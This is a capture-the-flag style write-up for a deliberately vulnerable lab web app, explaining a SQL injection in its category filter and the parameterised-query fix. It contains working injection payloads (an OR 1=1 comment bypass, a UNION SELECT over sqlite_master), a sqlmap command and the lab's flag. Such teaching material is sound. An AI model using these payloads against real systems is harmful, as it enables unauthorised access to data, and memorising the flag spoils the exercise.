# 02 Clearance: SQL injection in the category filter

**Target:** `https://northwind-02-clearance.vercel.app`
**Bug:** a query parameter is pasted into the SQL statement instead of being
bound to it.

---

## What this application does

A public catalogue with a category filter. Trade accounts with full clearance
can also see withheld supplier lines. No login is needed to reach the filter.

## What goes wrong

`apps/02-clearance/app/catalogue/route.js`:

```js
const sql = `SELECT sku, name, category, price_cents, classification`
          + ` FROM products WHERE category = '${category}'`
          + ` AND classification = 'public' ORDER BY id`;

rows = db().prepare(sql).all();
```

A bound query sends the statement and the value separately, and the database
never parses the value as SQL. Concatenating them removes that separation, so
the value becomes part of the statement.

## Reproducing it

```bash
BASE=https://northwind-02-clearance.vercel.app

curl -s -G --data-urlencode 'category=Home' "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+' | sort -u
# NW-HOM-101  NW-HOM-102  NW-HOM-103  NW-HOM-104
```

With `category` set to `Home' OR 1=1--`, the database receives:

```sql
WHERE category = 'Home' OR 1=1--' AND classification = 'public'
```

The `'` closes the string, `OR 1=1` is true for every row, and `--` comments
out the rest of the line including the clearance filter.

```bash
curl -s -G --data-urlencode "category=Home' OR 1=1--" "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+|G24\{[^}]+\}' | sort -u
# … NW-TRD-501  NW-TRD-502  NW-TRD-503  G24{InpuT_Becam3_C0d3}
```

Splicing a query on with `UNION` reads anything in the database:

```bash
curl -s -G --data-urlencode \
  "category=x' UNION SELECT sql,name,type,name,0 FROM sqlite_master WHERE type='table'--" \
  "$BASE/catalogue" | grep -oE 'CREATE TABLE[^<]*'
# CREATE TABLE products (
# CREATE TABLE settlements (
```

## Two things that waste time

**`--` ends at the line.** An earlier version had the two conditions on
separate lines, so the comment removed only the end of its own line and the
clearance filter survived. The injection then returned the public rows and
looked like it had failed. The conditions are on one line now, with the reason
recorded in the source.

**`UNION` needs the same number of columns on both sides.** SQLite rejects the
statement otherwise.

## A second problem

The SQLite error message is returned to the user:

```
We could not load that category. (SQLITE_ERROR: unrecognized token: …)
```

That turns what could be a blind injection into a verbose one. Same fix.

## The fix

```js
const sql = `SELECT sku, name, category, price_cents, classification`
          + ` FROM products WHERE category = ? AND classification = 'public'`
          + ` ORDER BY id`;

rows = db().prepare(sql).all(category);
```

An allow-list of valid categories is a reasonable second layer. Neither
escaping quotes nor blocking the words `OR` and `UNION` is a fix.

## Other things that do not work here

- The flag row cannot be reached by a legitimate query. It carries the
  `withheld` classification, which the clearance filter excludes. An earlier
  version put it in a category the public filter could name, so an
  administrator saw it with no injection at all.
- The search route in the same application is correctly parameterised, which
  makes the contrast easy to point at.

## Checking it

```bash
BASE=https://northwind-02-clearance.vercel.app bash apps/solve/solve-02.sh
```

`sqlmap -u "$BASE/catalogue?category=Home" --batch --risk=2 --level=3` also
finds this without the manual payload.